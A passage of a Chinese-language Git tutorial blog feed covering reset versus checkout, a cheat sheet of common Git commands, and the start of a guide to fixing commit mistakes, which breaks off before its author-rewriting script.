srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git commit"><br>现在你可以查看可到达的历史，即将会推送的历史，现在看起来有个 <strong>v1</strong> 版 <code>file-a.txt</code> 的提交，接着第二个提交将 <code>file-a.txt</code> 修改成了 <strong>v3</strong> 版并增加了 <code>file-b.txt</code>。 包含 <strong>v2</strong> 版本的文件已经不在历史中了。</p>
<h2 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h2><p>最后，你大概还想知道 <code>checkout</code> 和 <code>reset</code> 之间的区别。 和 reset 一样，checkout 也操纵三棵树，不过它有一点不同，这取决于你是否传给该命令一个文件路径。</p>
<h3 id="不带路径"><a href="#不带路径" class="headerlink" title="不带路径"></a>不带路径</h3><p>运行 <code>git checkout [branch]</code> 与运行 <code>git reset --hard [branch]</code> 非常相似，它会更新所有三棵树使其看起来像 [branch]，不过有两点重要的区别。</p>
<p>首先不同于 <code>reset --hard，checkout</code> 对工作目录是安全的，它会通过检查来确保不会将已更改的文件吹走。 其实它还更聪明一些。它会在工作目录中先试着简单合并一下，这样所有_还未修改过的_文件都会被更新。 而 <code>reset --hard</code> 则会不做检查就全面地替换所有东西。</p>
<p>第二个重要的区别是如何更新 HEAD。 reset 会移动 HEAD 分支的指向，而 checkout 只会移动 HEAD 自身来指向另一个分支。</p>
<p>例如，假设我们有 master 和 develop 分支，它们分别指向不同的提交；我们现在在 develop 上（所以 HEAD 指向它）。 如果我们运行 <code>git reset master</code>，那么 develop 自身现在会和 master 指向同一个提交。 而如果我们运行 <code>git checkout master</code> 的话，develop 不会移动，HEAD 自身会移动。 现在 HEAD 将会指向 master。</p>
<p>所以，虽然在这两种情况下我们都移动 HEAD 使其指向了提交 A，但_做法_是非常不同的。 reset 会移动 HEAD 分支的指向，而 checkout 则移动 HEAD 自身。<br><img src="http://img.saodiyang.com/Fpp-EOuRWOiTBtBWkjrvBIGHAlGm.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fpp-EOuRWOiTBtBWkjrvBIGHAlGm.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h3 id="带路径"><a href="#带路径" class="headerlink" title="带路径"></a>带路径</h3><p>运行 <code>checkout</code> 的另一种方式就是指定一个文件路径，这会像 reset 一样不会移动 HEAD。 它就像 <code>git reset [branch] file</code> 那样用该次提交中的那个文件来更新索引，但是它也会覆盖工作目录中对应的文件。 它就像是 <code>git reset --hard [branch] file</code>（如果 reset 允许你这样运行的话）- 这样对工作目录并不安全，它也不会移动 HEAD。</p>
<p>此外，同 <code>git reset</code> 和 <code>git add</code> 一样，<code>checkout</code> 也接受一个 –patch 选项，允许你根据选择一块一块地恢复文件内容。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望你现在熟悉并理解了 <code>reset</code> 命令，不过关于它和 <code>checkout</code> 之间的区别，你可能还是会有点困惑，毕竟不太可能记住不同调用的所有规则。</p>
<p>下面的速查表列出了命令对树的影响。 “HEAD” 一列中的 “REF” 表示该命令移动了 HEAD 指向的分支引用，而‘HEAD’ 则表示只移动了 HEAD 自身。 特别注意 <em>WD Safe?</em> 一列 - 如果它标记为 NO，那么运行该命令之前请考虑一下。</p>
<table><tr><td></td><td>**head**</td><td>**index**</td><td>**workdir**</td><td>**wd safe**</td></tr><tr><td>**commit level**</td><td colspan="4"></td></tr><tr><td>`reset --soft [commit]`</td><td>ref</td><td>no</td><td>no</td><td>yes</td></tr><tr><td>`reset [commit]`</td><td>ref</td><td>yes</td><td>no</td><td>yes</td></tr><tr><td>`reset --hard [commit]`</td><td>ref</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>`checkout [commit]`</td><td>head</td><td>yes</td><td>yes</td><td>yes</td></tr><tr><td>**file level**</td><td colspan="4"></td></tr><tr><td>`reset (commit) [file]`</td><td>no</td><td>yes</td><td>no</td><td>yes</td></tr><tr><td>`checkout (commit) [file]`</td><td>no</td><td>yes</td><td>yes</td><td>no</td></tr></table>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常用命令</title>
    <url>//Git-command</url>
    <content><![CDATA[<p>经常用到Git，但是很多命令记不住，将其整理于此。（大量摘自网络）</p>
<p>一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要要记住60~100个命令。<br><img src="http://img.saodiyang.com/FlWMWzIX9WE7PW-7eyeq8uaEJ_3p.png" class="lazyload" data-srcset="http://img.saodiyang.com/FlWMWzIX9WE7PW-7eyeq8uaEJ_3p.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git常用命令"></p>
<span id="more"></span>
<p>下面整理的 Git 命令清单。几个专业名词的译名如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Workspace：工作区</span><br><span class="line">Index / Stage：暂存区</span><br><span class="line">Repository：仓库区（本地仓库）</span><br><span class="line">Remote：远程仓库</span><br></pre></td></tr></table></figure>

<h2 id="新建版本仓库"><a href="#新建版本仓库" class="headerlink" title="新建版本仓库"></a>新建版本仓库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在当前目录新建一个Git代码库</span></span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个目录，将其初始化为Git代码库</span></span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一个项目和它的整个代码历史, -o 给远程仓库起名:faker,默认origin</span></span><br><span class="line">$ git <span class="built_in">clone</span> [-o faker] [url]</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示当前的Git配置</span></span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑Git配置文件</span></span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置提交代码时的用户信息</span></span><br><span class="line">$ git config [--global] user.name <span class="string">&quot;[name]&quot;</span></span><br><span class="line">$ git config [--global] user.email <span class="string">&quot;[email address]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置大小写敏感（windows不区分大小写的解决办法）</span></span><br><span class="line">$ git config core.ignorecase  <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加/删除文件"></a>增加/删除文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加指定文件到暂存区</span></span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加指定目录到暂存区，包括子目录</span></span><br><span class="line">$ git add [dir]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加当前目录的所有文件到暂存区</span></span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加每个变化前，都会要求确认</span></span><br><span class="line"><span class="comment"># 对于同一个文件的多处变化，可以实现分次提交</span></span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除工作区文件，并且将这次删除放入暂存区</span></span><br><span class="line">$ git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止追踪指定文件，但该文件会保留在工作区</span></span><br><span class="line">$ git rm --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改名文件，并且将这个改名放入暂存区</span></span><br><span class="line">$ git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure>
<h2 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提交暂存区到仓库区</span></span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交暂存区的指定文件到仓库区</span></span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span></span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交时显示所有diff信息</span></span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用一次新的commit，替代上一次提交</span></span><br><span class="line"><span class="comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span></span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重做上一次commit，并包括指定文件的新变化</span></span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有本地分支</span></span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有远程分支</span></span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支和远程分支</span></span><br><span class="line">$ git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支，并展示没有分支最后一次提交的信息</span></span><br><span class="line">$ git branch -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支，并展示没有分支最后一次提交的信息和远程分支的追踪情况</span></span><br><span class="line">$ git branch -vv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有已经合并到当前分支的分支</span></span><br><span class="line">$ git branch --merged</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有还没有合并到当前分支的分支</span></span><br><span class="line">$ git branch --no-merged</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，并切换到该分支</span></span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个与远程分支同名的分支，并切换到该分支</span></span><br><span class="line">$ git checkout --track [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向指定commit</span></span><br><span class="line">$ git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，与指定的远程分支建立追踪关系</span></span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定分支，并更新工作区</span></span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到上一个分支</span></span><br><span class="line">$ git checkout -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span></span><br><span class="line">$ git branch --set-upstream-to=[remote-branch]</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch] <span class="comment"># 已被弃用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并指定分支到当前分支</span></span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中断此次合并（你可能不想处理冲突）</span></span><br><span class="line">$ git merge --abort</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个commit，合并进当前分支</span></span><br><span class="line">$ git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment">#新增远程分支 远程分支需先在本地创建,再进行推送</span></span><br><span class="line">$ git push origin [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有tag</span></span><br><span class="line">$ git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在当前commit</span></span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在指定commit</span></span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地tag</span></span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程tag</span></span><br><span class="line">$ git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看tag信息</span></span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交指定tag</span></span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交所有tag</span></span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向某个tag</span></span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure>

<h2 id="查看信息-搜索"><a href="#查看信息-搜索" class="headerlink" title="查看信息/搜索"></a>查看信息/搜索</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示有变更的文件</span></span><br><span class="line">$ git status [-sb] <span class="comment">#s:short,给一个短格式的展示，b:展示当前分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的版本历史</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示commit历史，以及每次commit发生变更的文件</span></span><br><span class="line">$ git <span class="built_in">log</span> --<span class="built_in">stat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索提交历史，根据关键词</span></span><br><span class="line">$ git <span class="built_in">log</span> -S [keyword]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，每个commit占据一行</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个文件的版本历史，包括文件改名</span></span><br><span class="line">$ git <span class="built_in">log</span> --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件相关的每一次diff</span></span><br><span class="line">$ git <span class="built_in">log</span> -p [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示过去5次提交</span></span><br><span class="line">$ git <span class="built_in">log</span> -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图形化显示所有分支</span></span><br><span class="line">$ git <span class="built_in">log</span> --oneline --graph --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示在分支2而不在分支1中的提交</span></span><br><span class="line">$ git <span class="built_in">log</span> [分支1]..[分支2]</span><br><span class="line">$ git <span class="built_in">log</span> ^[分支1] [分支2]</span><br><span class="line">$ git <span class="built_in">log</span> [分支2] --not [分支1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示两个分支不同时包含的提交</span></span><br><span class="line">$ git <span class="built_in">log</span> [分支1]...[分支2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有提交过的用户，按提交次数排序</span></span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件是什么人在什么时间修改过</span></span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和工作区的差异</span></span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和上一个commit的差异</span></span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示工作区与当前分支最新commit之间的差异</span></span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示两次提交之间的差异</span></span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示今天你写了多少行代码</span></span><br><span class="line">$ git diff --shortstat <span class="string">&quot;@&#123;0 day ago&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交的元数据和内容变化</span></span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交发生变化的文件</span></span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交时，某个文件的内容</span></span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的最近几次提交</span></span><br><span class="line">$ git reflog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索你工作目录的文件，输出匹配行号</span></span><br><span class="line">$ git grep -n [关键字]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索你工作目录的文件，输出每个文件包含多少个匹配</span></span><br><span class="line">$ git grep --count [关键字]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化阅读</span></span><br><span class="line">$ git grep --<span class="built_in">break</span> --heading [关键字]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询iCheck这个字符串那次提交的</span></span><br><span class="line">$ git <span class="built_in">log</span> -SiCheck --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询git_deflate_bound函数每一次的变更</span></span><br><span class="line">$ git <span class="built_in">log</span> -L :git_deflate_bound:zlib.c</span><br></pre></td></tr></table></figure>
<h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载远程仓库的所有变动 [shortname] 为远程仓库的shortname, 如origin,为空时:默认origin</span></span><br><span class="line">$ git fetch [shortname]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有远程仓库</span></span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#显式地获得远程引用的完整列表 [shortname] 为远程仓库的shortname, 如origin,为空时:默认origin</span></span><br><span class="line">$ git ls-remote [shortname]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个远程仓库的信息 [remote] 为远程仓库的shortname, 如origin</span></span><br><span class="line">$ git remote show [shortname]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加一个新的远程仓库，并命名</span></span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重命名一个远程仓库（shortname）</span></span><br><span class="line">$ git remote rename [旧仓库名] [新仓库名]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除一个远程链接</span></span><br><span class="line">$ git remote rm [shortname] [url]</span><br><span class="line">$ git remote remove [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改远程仓库地址</span></span><br><span class="line">$ git remote set-url [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取回远程仓库的变化，并与本地分支合并</span></span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地当前分支到远程仓库</span></span><br><span class="line">git push [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地指定分支到远程仓库</span></span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送所有分支到远程仓库</span></span><br><span class="line">$ git push [remote] --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强行推送当前分支到远程仓库，即使有冲突</span></span><br><span class="line">$ git push [remote] --force</span><br></pre></td></tr></table></figure>
<h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 恢复暂存区的指定文件到工作区</span></span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复某个commit的指定文件到暂存区和工作区</span></span><br><span class="line">$ git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存区的所有文件到工作区</span></span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"><span class="comment">#只会保留源码（工作区），回退commit(本地仓库)与index（暂存区）到某个版本</span></span><br><span class="line">$ git reset &lt;commit_id&gt;   <span class="comment">#默认为 --mixed模式</span></span><br><span class="line">$ git reset --mixed &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#保留源码（工作区）和index（暂存区），只回退commit（本地仓库）到某个版本</span></span><br><span class="line">$ git reset --soft &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#源码（工作区）、commit（本地仓库）与index（暂存区）都回退到某个版本</span></span><br><span class="line">$ git reset --hard &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复到最后一次提交的状态</span></span><br><span class="line">$ git reset --hard HEAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个commit，用来撤销指定commit</span></span><br><span class="line"><span class="comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span></span><br><span class="line">$ git revert [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将工作区和暂存区的代码全都存储起来了</span></span><br><span class="line">$ git stash [save]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只保存工作区，不存储暂存区</span></span><br><span class="line">$ git stash --keep-index</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储工作区、暂存区和未跟踪文件</span></span><br><span class="line">$ git stash -u</span><br><span class="line">$ git stash --include-untracked</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不存储所有改动的东西，但会交互式的提示那些改动想要被储藏、哪些改动需要保存在工作目录中</span></span><br><span class="line">$ git stash --patch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不指定名字，Git认为指定最近的储藏，将存储的代码（工作区和暂存区）都应用到工作区</span></span><br><span class="line">$ git stash apply [stash@&#123;2&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储的工作区和暂存区的代码应用到工作区和暂存区</span></span><br><span class="line">$ git stash apply [stash@&#123;2&#125;] --index</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将存储的代码（工作区和暂存区）都应用到工作区，并从栈上扔掉他</span></span><br><span class="line">$ git stash pop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除stash@&#123;2&#125;的存储</span></span><br><span class="line">$ git stash drop [stash@&#123;2&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取储藏的列表</span></span><br><span class="line">$ git stash list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除工作目录中所有未跟踪的文件及口口那个的子目录，不会移除.gitiignore忽略的文件</span></span><br><span class="line">$ git clean -f -d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成一个可供发布的压缩包</span></span><br><span class="line">$ git archive</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git操作之高手过招</title>
    <url>//git-master</url>
    <content><![CDATA[<p>在使用git的过程中，总有一天你会遇到下面的问题：）<br>这些也是在开发过程中很常见的问题，以下也是作者的经验之谈，有不对的地方还请指出。</p>
<span id="more"></span>
<h3 id="最后一次commit信息写错了"><a href="#最后一次commit信息写错了" class="headerlink" title="最后一次commit信息写错了"></a>最后一次commit信息写错了</h3><p>如果只是提交信息写错了信息，可以通过以下命令单独修改提交信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意：</strong> 通过这样的过程修改提交信息后，相当于删除原来的提交，重新提交了一次。所有如果你在修改前已经将错误的那次提交push到服务端，那在修改后就需要通过 git pull 来合并代码（类似于两个分支了）。<br>通过 <code>git log --graph --oneline</code> 查看就会发现两个分支合并的痕迹</p>
</blockquote>
<h3 id="最后一次commit少添加一个文件"><a href="#最后一次commit少添加一个文件" class="headerlink" title="最后一次commit少添加一个文件"></a>最后一次commit少添加一个文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add file1</span><br><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>
<h3 id="最后一次commit多添加一个文件"><a href="#最后一次commit多添加一个文件" class="headerlink" title="最后一次commit多添加一个文件"></a>最后一次commit多添加一个文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git rm --cached file1</span><br><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>
<h3 id="移除add过的文件"><a href="#移除add过的文件" class="headerlink" title="移除add过的文件"></a>移除add过的文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#方法一</span></span><br><span class="line">$ git rm --cache [文件名]</span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line">$ git reset head [文件/文件夹]</span><br></pre></td></tr></table></figure>
<h3 id="回退本地commit（还未push）"><a href="#回退本地commit（还未push）" class="headerlink" title="回退本地commit（还未push）"></a>回退本地commit（还未push）</h3><p>这种情况发生在你的本地仓库，可能你add，commit以后发现代码有点问题，打算取消提交，用到下面命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只会保留源码（工作区），回退commit(本地仓库)与index（暂存区）到某个版本</span></span><br><span class="line">$ git reset &lt;commit_id&gt;   <span class="comment">#默认为 --mixed模式</span></span><br><span class="line">$ git reset --mixed &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#保留源码（工作区）和index（暂存区），只回退commit（本地仓库）到某个版本</span></span><br><span class="line">$ git reset --soft &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#源码（工作区）、commit（本地仓库）与index（暂存区）都回退到某个版本</span></span><br><span class="line">$ git reset --hard &lt;commit_id&gt;</span><br></pre></td></tr></table></figure>
<p>当然有人在push代码以后，也是用reset –hard回退代码到某个版本之前，但是这样会有一个问题，你线上的代码没有变化。</p>
<blockquote>
<p>!!!可以通过 git push –force 将本地的回退推送到服务端,但是除非你很清楚在这么做, 不推荐.</p>
</blockquote>
<p>所以，这种情况你要使用下面的方式了。</p>
<h3 id="回退本地commit（已经push）"><a href="#回退本地commit（已经push）" class="headerlink" title="回退本地commit（已经push）"></a>回退本地commit（已经push）</h3><p>对于已经把代码push到线上仓库,你回退本地代码其实也想同时回退线上代码,回滚到某个指定的版本,线上,线下代码保持一致.你要用到下面的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git revert &lt;commit_id&gt;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ol>
<li>git revert 用于反转提交，执行命令时要求工作树必须是干净的。</li>
<li>git revert 用一个新的提交来消除一个历时提交所做出的修改</li>
</ol>
<h3 id="回退单个文件的历史版本"><a href="#回退单个文件的历史版本" class="headerlink" title="回退单个文件的历史版本"></a>回退单个文件的历史版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看历史版本</span></span><br><span class="line">git <span class="built_in">log</span> 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#回退该文件到指定版本</span></span><br><span class="line">git reset [commit_id] 1.txt</span><br><span class="line">git checkout 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#提交</span></span><br><span class="line">git commit -m <span class="string">&quot;回退1.txt的历史版本&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="修改提交历史中的author和email"><a href="#修改提交历史中的author和email" class="headerlink" title="修改提交历史中的author和email"></a>修改提交历史中的author和email</h3><p>旧的：author:<code>Old-Author</code> email:<code>old@mail.com</code><br>新的：author:<code>New-Author</code> email:<code>new@mail.com</code><br>1.在git仓库内创建下面的脚本，如<code>change.sh</code></p>
